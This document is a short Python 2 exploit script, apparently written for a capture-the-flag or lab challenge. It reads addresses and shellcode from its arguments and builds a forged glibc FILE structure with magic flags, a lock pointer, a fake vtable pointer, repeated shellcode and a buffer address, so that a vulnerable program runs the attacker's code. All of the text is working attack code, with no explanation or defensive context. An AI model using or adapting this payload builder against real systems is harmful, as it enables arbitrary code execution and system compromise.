#!/usr/bin/env python

import sys

buf       = sys.argv[1].decode("hex")[::-1]
vtable = format(int(sys.argv[1], 16) + 156, 'x').decode("hex")[::-1]
lock      = sys.argv[2].decode("hex")[::-1]
shellcode = sys.argv[3].decode("hex")[::-1]

fake_fd = ""
fake_fd += "\x85\x21\xad\xfb"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x04\x01"
fake_fd += lock
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += "\x01\x01\x01\x01"
fake_fd += vtable
fake_fd += shellcode
fake_fd += shellcode
fake_fd += shellcode
fake_fd += shellcode
fake_fd += shellcode
fake_fd += shellcode
fake_fd += shellcode
fake_fd += shellcode
fake_fd += shellcode
fake_fd += shellcode
fake_fd += shellcode
fake_fd += shellcode
fake_fd += shellcode
fake_fd += shellcode
fake_fd += shellcode
fake_fd += shellcode
fake_fd += shellcode
fake_fd += shellcode
fake_fd += shellcode
fake_fd += shellcode
fake_fd += shellcode
fake_fd += "\xff\xff\xff\xff"
fake_fd += "\xff\xff\xff\xff"
fake_fd += "\xff\xff\xff\xff"
fake_fd += "\xff\xff\xff\xff"
fake_fd += buf

sys.stdout.write(fake_fd)
